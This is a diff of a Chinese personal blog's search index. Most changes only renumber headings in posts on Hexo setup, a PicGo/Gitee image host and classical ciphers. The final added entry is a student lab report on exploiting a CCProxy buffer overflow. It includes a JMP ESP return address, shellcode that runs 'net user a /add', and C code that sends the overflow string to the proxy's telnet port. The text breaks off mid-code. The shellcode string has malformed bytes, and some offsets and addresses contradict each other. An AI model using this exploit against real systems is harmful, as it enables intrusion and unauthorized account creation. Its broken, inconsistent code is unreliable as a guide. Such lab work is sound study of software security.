@@ -3,28 +3,28 @@
   <entry>
     <title>Hexo 建站笔记</title>
     <url>/2021/04/08/Hexo-%E5%BB%BA%E7%AB%99%E7%AC%94%E8%AE%B0/</url>
-    <content><![CDATA[<h1 id="一、搭建Hexo框架"><a href="#一、搭建Hexo框架" class="headerlink" title="一、搭建Hexo框架"></a>一、搭建Hexo框架</h1><p>本文基于windows操作系统搭建，hexo的相关操作可以用cmd命令台进行，也可以用下面安装的Git进行（推荐）；关于hexo主题的相关美化见后续文章，该系列可能会保持更新。另：本人也作为刚接触这里的新手，在文章中主要总结个人建站过程中的参考所得，望有不对的地方不吝赐教！</p>
-<h2 id="1、设置淘宝镜像"><a href="#1、设置淘宝镜像" class="headerlink" title="1、设置淘宝镜像"></a>1、设置淘宝镜像</h2><p>由于在windows上使用npm下载时可能会速度过慢，所以这里改为淘宝镜像网站：</p>
+    <content><![CDATA[<h1 id="搭建Hexo框架"><a href="#搭建Hexo框架" class="headerlink" title="搭建Hexo框架"></a>搭建Hexo框架</h1><p>本文基于windows操作系统搭建，hexo的相关操作可以用cmd命令台进行，也可以用下面安装的Git进行（推荐）；关于hexo主题的相关美化见后续文章，该系列可能会保持更新。另：本人也作为刚接触这里的新手，在文章中主要总结个人建站过程中的参考所得，望有不对的地方不吝赐教！</p>
+<h2 id="设置淘宝镜像"><a href="#设置淘宝镜像" class="headerlink" title="设置淘宝镜像"></a>设置淘宝镜像</h2><p>由于在windows上使用npm下载时可能会速度过慢，所以这里改为淘宝镜像网站：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry <span class="string">&quot;https://registry.npm.taobao.org&quot;</span></span><br></pre></td></tr></table></figure>
-<h2 id="2、安装Git"><a href="#2、安装Git" class="headerlink" title="2、安装Git"></a>2、安装Git</h2><p>Git官网地址：<a href="https://gitforwindows.org/">https://gitforwindows.org/</a></p>
+<h2 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h2><p>Git官网地址：<a href="https://gitforwindows.org/">https://gitforwindows.org/</a></p>
 <p>安装过程无脑“下一步”即可。</p>
-<h2 id="3、安装Node-js"><a href="#3、安装Node-js" class="headerlink" title="3、安装Node.js"></a>3、安装Node.js</h2><p>Node.js官网：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p>
+<h2 id="安装Node-js"><a href="#安装Node-js" class="headerlink" title="安装Node.js"></a>安装Node.js</h2><p>Node.js官网：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p>
 <p>这里推荐安装LTS(长期支持)版，选择对应的系统版本即可。</p>
 <p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210408-01.png" alt="image-20210408184444633"></p>
-<h2 id="4、安装Hexo"><a href="#4、安装Hexo" class="headerlink" title="4、安装Hexo"></a>4、安装Hexo</h2><p>可以自行创建目录，名称随意，例如D:\Hexo\myblog，并在myblog文件夹右键使用Git bash here(或者cmd进入该文件夹)，命令行输入：</p>
+<h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>可以自行创建目录，名称随意，例如D:\Hexo\myblog，并在myblog文件夹右键使用Git bash here(或者cmd进入该文件夹)，命令行输入：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#安装Hexo</span></span><br><span class="line">npm install -g hexo-cli</span><br><span class="line"><span class="comment">#初始化博客</span></span><br><span class="line">hexo init</span><br><span class="line"><span class="comment">#Hexo三连,分别为清空生成文件、生成网站文件、启动本地预览</span></span><br><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
 <p>此时若没有错误情况，由于hexo默认位于4000端口开启，则可以在浏览器中打开<strong><em>localhost:4000</em></strong>，就可以看到已经初始化的Hexo博客，默认产生第一篇文章Hello world!此外也可以更换端口使用命令  <strong>hexo s -p 端口号</strong>  即可。</p>
-<h2 id="5、博客部署"><a href="#5、博客部署" class="headerlink" title="5、博客部署"></a>5、博客部署</h2><p>由于我个人搭建的时候服务器仍未达到备案的期限，所以这里介绍将个人博客部署到github上面，后续若部署到个人域名时再进行更新。<br>首先，登录github创建一个新的仓库，并将仓库名命名为  <strong><em>用户名.github.io</em></strong>，注意这里仓库的名字是固定格式！！！<br>打开博客根目录（Hexo/myblog)下的根配置文件  <strong><em>_config.yml</em></strong>  文件找到deploy项，修改如下代码：</p>
+<h2 id="博客部署"><a href="#博客部署" class="headerlink" title="博客部署"></a>博客部署</h2><p>由于我个人搭建的时候服务器仍未达到备案的期限，所以这里介绍将个人博客部署到github上面，后续若部署到个人域名时再进行更新。<br>首先，登录github创建一个新的仓库，并将仓库名命名为  <strong><em>用户名.github.io</em></strong>，注意这里仓库的名字是固定格式！！！<br>打开博客根目录（Hexo/myblog)下的根配置文件  <strong><em>_config.yml</em></strong>  文件找到deploy项，修改如下代码：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">   <span class="built_in">type</span>: <span class="string">&#x27;git&#x27;</span></span><br><span class="line">   repo: https://github.com/用户名/仓库名</span><br><span class="line">   <span class="comment"># 如Https://github.com/zhangsan/zhangsan.github.io</span></span><br><span class="line">   branch: master</span><br></pre></td></tr></table></figure>
 <p>注： 注意在本博客几乎所有配置文件中，冒号之后都留有空格</p>
 <p>在进行上传之前，需要先在Git bash中进行对<strong>user.name</strong>和<strong>user.email</strong>的设置，如下：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;Github用户名&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;GitHub绑定邮箱&quot;</span></span><br><span class="line"><span class="comment">#最后再进行上传</span></span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
 <p>他喵的现在Github时不时登录不上去，所以在进行hexo d部署的时候也经常会出现超时的错误，还是建议部署到自己的域名上去，后续部署时会对该文章进行更新的。</p>
-<h1 id="二、基础配置"><a href="#二、基础配置" class="headerlink" title="二、基础配置"></a>二、基础配置</h1><h2 id="1、主题设置"><a href="#1、主题设置" class="headerlink" title="1、主题设置"></a>1、主题设置</h2><p>hexo提供了大量可选的主题，参考网站：<a href="https://hexo.io/themes/">Hexo主题</a></p>
+<h1 id="基础配置"><a href="#基础配置" class="headerlink" title="基础配置"></a>基础配置</h1><h2 id="主题设置"><a href="#主题设置" class="headerlink" title="主题设置"></a>主题设置</h2><p>hexo提供了大量可选的主题，参考网站：<a href="https://hexo.io/themes/">Hexo主题</a></p>
 <p>在根目录配置文件中可以设置主题，这里以butterfly主题为例，修改<strong><em>theme</em></strong>字条即可：<br><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210408204749.png" alt="alt 主题设置"></p>
 <p>在上述网站或其他途径选择主题后需要将主题文件保存到<strong>/themes</strong>目录下，例如：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装渲染插件</span></span><br><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure>
-<h2 id="2、基础页"><a href="#2、基础页" class="headerlink" title="2、基础页"></a>2、基础页</h2><p>hexo创建页面的命令如下：</p>
+<h2 id="基础页"><a href="#基础页" class="headerlink" title="基础页"></a>基础页</h2><p>hexo创建页面的命令如下：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new page 页面名称</span><br></pre></td></tr></table></figure>
 <p>创建成功后会在命令行中提示新建页面的位置，对文件<strong>index.md</strong>进行编辑可以修改页面布局。对不同主题，可以查看相应主题的文档使用，这里以butterfly主题对页面属性为例，如下表：</p>
 <div class="table-container">
@@ -75,17 +75,17 @@
 </tbody>
 </table>
 </div>
-<h2 id="3、文章页"><a href="#3、文章页" class="headerlink" title="3、文章页"></a>3、文章页</h2><p>创建命令为：</p>
+<h2 id="文章页"><a href="#文章页" class="headerlink" title="文章页"></a>文章页</h2><p>创建命令为：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;文章命令&quot;</span></span><br></pre></td></tr></table></figure>
 <p>同上述基础页介绍，具体属性等可参照下面的参考资料。</p>
-<h2 id="4、页面设置"><a href="#4、页面设置" class="headerlink" title="4、页面设置"></a>4、页面设置</h2><p>打开根目录下的<strong><em>_config.yml</em></strong>文件可以看到下面的属性：</p>
+<h2 id="页面设置"><a href="#页面设置" class="headerlink" title="页面设置"></a>页面设置</h2><p>打开根目录下的<strong><em>_config.yml</em></strong>文件可以看到下面的属性：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#site</span></span><br><span class="line">title: (1)</span><br><span class="line">description: (2)</span><br><span class="line">author: (3)</span><br><span class="line">language: 默认en,可修改</span><br><span class="line">email: <span class="string">&#x27;邮箱地址&#x27;</span></span><br></pre></td></tr></table></figure>
 <p>相应位置如下图：</p>
 <p><div align="center">
         <img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/%E4%B8%8B%E8%BD%BD.png">  
         <img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210408212212.png">
 </div><br>后续会写对butterfly的美化过程。</p>
-<h1 id="三、参考资料"><a href="#三、参考资料" class="headerlink" title="三、参考资料"></a>三、参考资料</h1><p>【1】<a href="https://hexo.io/docs/">Hexo文档</a><br>【2】<a href="https://butterfly.js.org/posts/21cfbf15/">Jerry大佬教程</a></p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>【1】<a href="https://hexo.io/docs/">Hexo文档</a><br>【2】<a href="https://butterfly.js.org/posts/21cfbf15/">Jerry大佬教程</a></p>
 ]]></content>
       <categories>
         <category>Hexo</category>
@@ -252,11 +252,11 @@
   <entry>
     <title>PicGo + Gitee 搭建免费图床</title>
     <url>/2021/04/09/PicGo-Gitee-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/</url>
-    <content><![CDATA[<h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>搭建好自己的博客之后，非常激动啊！！！迫不及待的想写一篇文章来试试水，在往博客中插入图片时遇到了一个很大的问题：图片路径哪里来？由于搭建的是静态博客，如果将图片存放在本地硬盘空间内，网络端访问必然会产生无法获取图片的问题！玛莎卡？将图片存放在主题的 /source/img 文件夹下再在使用时使用相对路径？</p>
+    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭建好自己的博客之后，非常激动啊！！！迫不及待的想写一篇文章来试试水，在往博客中插入图片时遇到了一个很大的问题：图片路径哪里来？由于搭建的是静态博客，如果将图片存放在本地硬盘空间内，网络端访问必然会产生无法获取图片的问题！玛莎卡？将图片存放在主题的 /source/img 文件夹下再在使用时使用相对路径？</p>
 <p>细思极恐啊！当图片数量众多，项目文件必然臃肿，部署到云端也就更加慢了。在网上查找解决方法时发现可以搭建 <strong><em>图床</em></strong>  ，顾名思义就是云端用于存储图片的服务器吧，网上现在主流图床有SM.MS、腾讯云COS、Github图床、七牛、阿里云等，当然免费的图床主推Github和Gitee了，但是Github在国外时不时无法连接，而且速度肯定没有国内的码云快了，当然使用阿里云和腾讯云那些就不比了（白嫖真香！）。所以这里就采用了 <u><strong><em>Gitee + PicGo</em></strong></u> 搭建自己的图床。</p>
 <p>注：使用码云搭建的图床具有对图片大小的限制，超过1MB大小的图片需要登录才能进行显示，因此这里提供一个用于压缩图片的网站：</p>
 <p><strong><em><a href="https://tinypng.com/">TingPNG:<u>压缩图片</u></a></em></strong></p>
-<h2 id="2、合成材料"><a href="#2、合成材料" class="headerlink" title="2、合成材料"></a>2、合成材料</h2><div class="table-container">
+<h2 id="合成材料"><a href="#合成材料" class="headerlink" title="合成材料"></a>合成材料</h2><div class="table-container">
 <table>
 <thead>
 <tr>
@@ -273,12 +273,12 @@
 </table>
 </div>
 <p>注：<a href="https://github.com/Molunerfinn/PicGo">PicGo开源项目地址，可以查看使用文档</a></p>
-<h2 id="3、Gitee准备"><a href="#3、Gitee准备" class="headerlink" title="3、Gitee准备"></a>3、Gitee准备</h2><p>类似于Github，先创建一个仓库，这里姑且命名为images，在该仓库中创建一个文件夹用于存放图片（也可以不创建），这里使用img作为文件夹名称。</p>
+<h2 id="Gitee准备"><a href="#Gitee准备" class="headerlink" title="Gitee准备"></a>Gitee准备</h2><p>类似于Github，先创建一个仓库，这里姑且命名为images，在该仓库中创建一个文件夹用于存放图片（也可以不创建），这里使用img作为文件夹名称。</p>
 <p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409203754.png" alt="alt 示例"></p>
 <p>创建仓库时需要添加开源许可证啥的，跟着走就行，记得“是否开源”选择“公开”。</p>
 <p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409204152.png" alt="alt acejha"></p>
 <p>这些结束后，需要创建一个token，下面会用到这个私人令牌，具体方法为：“个人主页→个人设置→私人令牌→生成新令牌”，添加描述后默认勾选提交即可，复制到剪贴板备用。在私人令牌管理界面可以对令牌进行删除、修改和重新生成等操作。</p>
-<h2 id="4、PicGo配置"><a href="#4、PicGo配置" class="headerlink" title="4、PicGo配置"></a>4、PicGo配置</h2><p>安装好对应系统的PicGO后，在插件设置中找到Gitee-uploader插件安装，注意安装后重启软件。在正确安装的情况下，重启应用打开图床设置可以找到gitee选项。</p>
+<h2 id="PicGo配置"><a href="#PicGo配置" class="headerlink" title="PicGo配置"></a>PicGo配置</h2><p>安装好对应系统的PicGO后，在插件设置中找到Gitee-uploader插件安装，注意安装后重启软件。在正确安装的情况下，重启应用打开图床设置可以找到gitee选项。</p>
 <p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409205044.png" alt="alt jhhg"></p>
 <p>gitee设置界面，相关参数如下表：</p>
 <div class="table-container">
@@ -311,7 +311,7 @@
 </div>
 <p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409205324.png" alt="alt shiji"></p>
 <p>点击确定和设为默认图床即可。</p>
-<h2 id="5、说明"><a href="#5、说明" class="headerlink" title="5、说明"></a>5、说明</h2><p>在上传区，可以选择拖拽上传，也可以点击剪贴板上传直接将截图上传，上传成功的话会有系统消息提醒。同时，在下方可以选择返回值的格式，返回值会在剪贴板中保留，在编写文档时直接粘贴即可。相册中可以查看已经上传的图片，香的一批啊有木有！</p>
+<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>在上传区，可以选择拖拽上传，也可以点击剪贴板上传直接将截图上传，上传成功的话会有系统消息提醒。同时，在下方可以选择返回值的格式，返回值会在剪贴板中保留，在编写文档时直接粘贴即可。相册中可以查看已经上传的图片，香的一批啊有木有！</p>
 <p>最后附上一个我个人经常选择图片的网站：<a href="https://beta.bz.zzzmh.cn/index">极简壁纸</a></p>
 <p>参考：<a href="https://github.com/Molunerfinn/PicGo">https://github.com/Molunerfinn/PicGo</a></p>
 ]]></content>
@@ -626,7 +626,7 @@
 <p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418231325.png" alt="alt 置换密码解密"></p>
 </li>
 </ul>
-<h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ul>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
 <li><a href="https://blog.csdn.net/weixin_44883180/article/details/109009221">几种古典密码学算法的C实现</a></li>
 <li><a href="https://blog.csdn.net/qq_45163122/article/details/104482811">希尔（Hill）密码（C语言）</a></li>
 <li><a href="https://blog.csdn.net/dyw_666666/article/details/82466894">置换密码代码简单实现（C语言）</a></li>
@@ -638,6 +638,96 @@
       <tags>
         <tag>密码学</tag>
         <tag>算法</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Win32漏洞实例分析---CCproxy</title>
+    <url>/2021/06/27/Win32%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90-CCproxy/</url>
+    <content><![CDATA[<hr>
+<p>$ps:$正好这两天在备考软件安全要复习实验内容，索性就打算复习实验的同时将部分内容的报告展示出来，做一次记录。实验中的内容可能在实际操作时会有差错，BUG可能会有的。</p>
+<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p><strong>操作系统：Microsoft windows XP SP3 或者 win7</strong></p>
+<p><strong>溢出软件：CCPROXY</strong></p>
+<p><strong>溢出工具：OllyDbg，Visual C++ 6.0</strong></p>
+<hr>
+<h1 id="实验过程记录"><a href="#实验过程记录" class="headerlink" title="实验过程记录"></a>实验过程记录</h1><h2 id="找到溢出点"><a href="#找到溢出点" class="headerlink" title="找到溢出点"></a>找到溢出点</h2><p>首先找出溢出点，在XP主机上打开CCProxy后再cmd控制台上利用“telnet 127.0.0.1”命令连接CCProxy代理服务，实验发现当ping一个较短的字符串时，程序会正常执行并提示“Host not found”，而当程序ping一个较长的字符串时会发生溢出并报错（如下图），利用简单的二分法多次尝试可以发现当ping后最多接1009个字符时恰好不产生溢出，而当其后有1010个字符时会发生溢出，且会溢出覆盖到EIP。</p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215240.png" alt="溢出点查询" style="zoom:67%;" /></p>
+<p>得知上述溢出点后，接下来便可以进行漏洞利用，这里采用的工具为x32dbg，根据之前的“Host not found”提示，我们可以在dbg中进行字符串的搜索并定位到该字符串所在语句（如下图所示），在该语句处设置断点。</p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215326.png" alt="查找“Host not Found”语句"></p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215440.png" alt="设置断点"></p>
+<h2 id="设置-JMP-ESP-跳转"><a href="#设置-JMP-ESP-跳转" class="headerlink" title="设置$JMP\ ESP$跳转"></a>设置$JMP\ ESP$跳转</h2><p>上述断点设置成功后，在该软件中运行CCProxy并在控制台中ping一个较长的字符串（使其发生溢出），在该软件中会在断点前停下来，这时单步步过执行到“ret 0xc”指令处观察此时的ESP=0x012B66F0，由此可知当“ret 0xc”指令执行后的下一指令对应地址为0x012B66F0，而执行后EIP=[ESP]且ESP=ESP+0xC+0x4，接下来考虑将ESP指向地址覆盖为JMP ESP指令所在地址，然后将修改过的ESP填充我们想要执行的shellcode即可。</p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215648.png" alt="Ret指令前的ESP指向值"></p>
+<p>此时的我们想要将ESP指向地址执行JMP ESP指令，在本区域内搜索指令“JMP ESP”后发现没有该指令，于是我们查询所有模块中的指令即可。这里搜索到的“JMP ESP”指令众多，考虑到后面我们将JMP ESP指令填入shellcode时将其存放在字符数组内而可编写字符的ASCII范围为0x20-0x7F，我们可以选取0x00514C6E。（也可以使用\x转义）。</p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215743.png" alt="查询JMP ESP指令"></p>
+<p>接下来只需要先把ESP指向地址覆盖为我们想要的“JMP ESP”指令地址即可。观察可以发现在当前ESP指令的接下来一段数据已经被我们输入的字符串（这里输入的全部是‘a’即ASCII码61覆盖）。</p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626215834.png" alt="修改ESP指向地址" style="zoom:50%;" /></p>
+<h2 id="添加-Shellcode"><a href="#添加-Shellcode" class="headerlink" title="添加$Shellcode$"></a>添加$Shellcode$</h2><p>接下来我们来实现基本的添加用户的shellcode，在cmd控制台中的命令为“net user a /add”（这里添加一个用户名为a的用户）。在程序语言中便需要调用system函数，在工具中查看当前程序的符号界面会发现该程序加载了“msvcrt.dll”的系统动态链接库文件，而其中便包含有system函数，因此我们就可以利用这一点实现shellcode的注入及利用。</p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626220117.png" alt="程序加载了msvcrt.dll库文件"></p>
+<p>接下来我们先编写shellcode来获取shellcode的机器码然后实现注入，这里利用的工具为VS2019，实现win32控制台应用的方法为“新建桌面引导→控制台程序”，编写shellcode的代码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winbase.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    LoadLibrary(<span class="string">&quot;msvcrt.dll&quot;</span>);</span><br><span class="line">    __asm&#123;</span><br><span class="line">            push ebp ;保存ebp，esp－<span class="number">4</span></span><br><span class="line">            mov ebp,esp ;给ebp赋新值，将作为局部变量的基指针</span><br><span class="line">            <span class="keyword">xor</span> edi,edi ;</span><br><span class="line">            push edi ;压入<span class="number">0</span>，esp－<span class="number">4</span>,;作用是构造字符串的结尾\<span class="number">0</span>字符 </span><br><span class="line">            sub esp,<span class="number">0</span>ch</span><br><span class="line">            mov byte ptr [ebp<span class="number">-10</span>h],<span class="number">6</span>eh;n</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0f</span>h],<span class="number">65</span>h;e</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>eh],<span class="number">74</span>h;t</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>dh],<span class="number">20</span>h;空格</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>ch],<span class="number">75</span>h;u</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0b</span>h],<span class="number">73</span>h;s</span><br><span class="line">            mov byte ptr [ebp<span class="number">-0</span>ah],<span class="number">65</span>h;e</span><br><span class="line">            mov byte ptr [ebp<span class="number">-09</span>h],<span class="number">72</span>h;r</span><br><span class="line">            mov byte ptr [ebp<span class="number">-08</span>h],<span class="number">20</span>h;空格</span><br><span class="line">            mov byte ptr [ebp<span class="number">-07</span>h],<span class="number">61</span>h;a</span><br><span class="line">            mov byte ptr [ebp<span class="number">-06</span>h],<span class="number">20</span>h;空格</span><br><span class="line">            mov byte ptr [ebp<span class="number">-05</span>h],<span class="number">2f</span>h;/</span><br><span class="line">            mov byte ptr [ebp<span class="number">-04</span>h],<span class="number">61</span>h;a</span><br><span class="line">            mov byte ptr [ebp<span class="number">-03</span>h],<span class="number">64</span>h;d</span><br><span class="line">            mov byte ptr [ebp<span class="number">-02</span>h],<span class="number">64</span>h;d</span><br><span class="line">            lea eax,[ebp<span class="number">-10</span>h] ;</span><br><span class="line">            push eax ;串地址作为参数入栈</span><br><span class="line">            mov eax, <span class="number">0x77bf93c7</span>;</span><br><span class="line">            call eax ;调用system</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后反汇编得到汇编代码，在memory中可以查看到汇编语句在内存中的机器码表示，由于程序已经加载了msvcrt.dll库文件，因此我们这里只需要shellcode的机器码即可，观察汇编代码块中语句的起始地址为01001782（push ebp），结束地址为call命令所在地址，在memory中查找该地址对应的机器码即可。</p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626220413.png" alt="Shellcode对应机器码" style="zoom:50%;" /></p>
+<p>接下来利用缓冲区的溢出来执行shellcode，上述所得在第1012个字节处发生溢出，因此我们需要执行“JMP ESP”指令就需要将该指令的地址填入1013-1016字节，及为上述的00514C6E。当执行完该指令后就会跳转到已经经过变化的ESP处，此时的ESP执行地址应该为1013+0xC+0x4个字节；这里由于CCProxy会有一个字符串的覆盖操作，将第5个字节到1012个字节复制到1013+0xC+0x4字节处，所以我们的shellcode需要放在第5个字节到第1012个字节之间。</p>
+<p>本机与CCPROXY 的连接是TCP连接，首先需要编写程序以TELNET的形式登陆到 CCPROXY 上，即建立TCP连接，去连接 CCPROXY 的23号端口，一旦连接建立好了后， 便可以发送 TCP 报文，报文的内容是ping主机名\r\n ，主机名便填写上文提到的超长的字符串进行溢出。注入 shellcode 后执行7FFA4512 即 JMP ESP。字符串的前 4 个字节为无用的字节，从第五个字节开始便可以用来写 ShellCode，构造的ping主机名应当如下：4 个字节的无用指令+ShellCode（最多可以从第5个字节到1012个字节）+jmp esp（第1013个字节到第 1016个）+最后的填充字节。</p>
+<p>编写的C语言代码及shellcode机器码如下：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;MSWSock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LEN 2000</span></span><br><span class="line"><span class="keyword">char</span> shell[] =<span class="string">&quot;\x55\x8b\xec\x33\xff\x57\x83\xec &quot;</span></span><br><span class="line">              <span class="string">&quot;\x0c\xc6\x45\xf0\x6e\xc6\x45\xf1 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x65\xc6\x45\xf2\x74\xc6\x45\xf3 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x20\xc6\x45\xf4\x75\xc6\x45\xf5 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x73\xc6\x45\xf6\x65\xc6\x45\xf7 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x72\xc6 x45\xf8\x20\xc6\x45\xf9 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x61\xc6 x45\xfa\x20\xc6\x45\xfb &quot;</span></span><br><span class="line">              <span class="string">&quot;\x2f\xc6\x45\xfc\x61\xc6\x45\xfd &quot;</span></span><br><span class="line">              <span class="string">&quot;\x64\xc6\x45\xfe\x64\x8d\x45\xf0 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x50\xb8\xc7\x93\xbf\x77\xff\xd0 &quot;</span>;<span class="comment">//shellcode机器码</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WSADATA ws;<span class="comment">//初始化ws</span></span><br><span class="line">    <span class="keyword">int</span> ret = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;ws);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line">    sa.sin_family = AF_INET;</span><br><span class="line">    sa.sin_port = htons(<span class="number">23</span>);</span><br><span class="line">    sa.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LEN];</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">1024</span>];</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">    buf[<span class="number">3</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">    buf[<span class="number">4</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">int</span> l = <span class="built_in">strlen</span>(shell);</span><br><span class="line">    buf[<span class="number">5</span>] = buf[<span class="number">6</span>] = buf[<span class="number">7</span>] = buf[<span class="number">8</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="comment">//前4个字节为无用字节</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">9</span>; j &lt; <span class="number">9</span> + l; j++)</span><br><span class="line">        buf[j] = shell[j - <span class="number">9</span>];</span><br><span class="line">    <span class="comment">//插入shellcode</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">9</span> + l; i &lt; <span class="number">1012</span> + <span class="number">5</span>; i++)</span><br><span class="line">        buf[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="comment">//到溢出点为止都填入无用字节</span></span><br><span class="line">    buf[<span class="number">1017</span>] = <span class="number">0x6E</span>;</span><br><span class="line">    buf[<span class="number">1018</span>] = <span class="number">0x4C</span>;</span><br><span class="line">    buf[<span class="number">1019</span>] = <span class="number">0x51</span>;</span><br><span class="line">    buf[<span class="number">1020</span>] = <span class="number">0x00</span>;</span><br><span class="line">    <span class="comment">//这里为JMP ESP的地址，00514C6E</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1021</span>; i &lt; <span class="number">1998</span>; i++)</span><br><span class="line">        buf[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    buf[<span class="number">1998</span>] = <span class="string">&#x27;\r&#x27;</span>;</span><br><span class="line">    buf[<span class="number">1999</span>] = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="comment">//命令结束回车换行</span></span><br><span class="line">    <span class="comment">//创建Socket</span></span><br><span class="line">    SOCKET sc = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span 